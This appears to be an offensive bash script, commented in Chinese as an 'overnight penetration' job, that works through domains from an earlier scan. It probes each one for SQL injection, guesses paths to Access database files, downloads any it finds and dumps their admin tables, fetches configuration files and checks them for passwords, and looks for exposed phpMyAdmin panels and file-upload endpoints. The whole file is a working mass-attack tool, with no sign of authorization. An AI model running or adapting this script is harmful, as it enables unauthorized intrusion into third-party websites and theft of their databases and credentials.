#!/bin/bash
# 通宵渗透: 等扫描完成→对命中目标深度攻击
echo "DEEP_START: $(date)" | tee -a /tmp/deep_hits.txt

# 等扫描完成
echo "等待扫描完成..."
while pgrep -f "overnight.sh" > /dev/null 2>&1; do
  sleep 60
done
echo "扫描已结束,开始渗透..."

# 读取扫描命中
[ ! -f /tmp/on_hits.txt ] && echo "无命中文件" && exit 0

grep '|' /tmp/on_hits.txt | cut -d'|' -f1 | sort -u | while read domain; do
  name=$(echo "$domain" | cut -d. -f1)
  echo "=== $domain ===" | tee -a /tmp/deep_hits.txt
  
  # 1. SQL注入
  for p in "/?id=" "/news.asp?id=" "/product.asp?id=" "/index.php?id="; do
    b1=$(curl -sk -L --connect-timeout 2 -o /dev/null -w "%{size_download}" "http://$domain${p}1" 2>/dev/null)
    b2=$(curl -sk -L --connect-timeout 2 -o /dev/null -w "%{size_download}" "http://$domain${p}1%27" 2>/dev/null)
    if [ "$b1" != "$b2" ] && [ "$b1" -gt 500 ]; then
      echo "  SQLi: $domain${p} (${b1}B vs ${b2}B)" | tee -a /tmp/deep_hits.txt
    fi
  done
  
  # 2. MDB下载
  for mdb in "/%23${name}%23.mdb" "/data/db.mdb" "/database/db.mdb" "/db/db.mdb" "/databackup/db.mdb"; do
    size=$(curl -sk -L --connect-timeout 3 -o /dev/null -w "%{size_download}" "http://$domain$mdb" 2>/dev/null)
    if [ "$size" -gt 5000 ]; then
      curl -sk -L --connect-timeout 10 "http://$domain$mdb" -o "/tmp/mdb_${name}.mdb" 2>/dev/null
      echo "  MDB: $domain$mdb (${size}B → /tmp/mdb_${name}.mdb)" | tee -a /tmp/deep_hits.txt
      # 破解MDB
      mdb-export "/tmp/mdb_${name}.mdb" admin 2>/dev/null | head -5 | tee -a /tmp/deep_hits.txt
    fi
  done
  
  # 3. 配置文件泄露
  for cfg in "/config.php" "/web.config" "/config.inc.php" "/data/config.php" "/inc/config.asp"; do
    size=$(curl -sk -L --connect-timeout 3 -o /dev/null -w "%{size_download}" "http://$domain$cfg" 2>/dev/null)
    if [ "$size" -gt 100 ]; then
      has_pass=$(curl -sk -L --connect-timeout 3 "http://$domain$cfg" 2>/dev/null | grep -c "password\|user\|db\|mysql\|database")
      [ "$has_pass" -gt 2 ] && echo "  CONFIG: $domain$cfg (${size}B,含密码)" | tee -a /tmp/deep_hits.txt
    fi
  done
  
  # 4. phpMyAdmin
  for pma in "/phpmyadmin" "/phpMyAdmin" "/pma" "/mysql" "/adminer"; do
    code=$(curl -sk -L --connect-timeout 3 -o /dev/null -w "%{http_code}" "http://$domain$pma" 2>/dev/null)
    [ "$code" = "200" ] && echo "  phpMyAdmin: $domain$pma" | tee -a /tmp/deep_hits.txt
  done
  
  # 5. 文件上传
  for upload in "/admin/upload.php" "/upload.php" "/admin/upload.aspx" "/kindeditor/php/upload_json.php" "/ueditor/php/controller.php?action=uploadfile"; do
    code=$(curl -sk -L --connect-timeout 2 -o /dev/null -w "%{http_code}" "http://$domain$upload" 2>/dev/null)
    [ "$code" = "200" ] && echo "  UPLOAD: $domain$upload" | tee -a /tmp/deep_hits.txt
  done
done

echo "DEEP_END: $(date)" | tee -a /tmp/deep_hits.txt
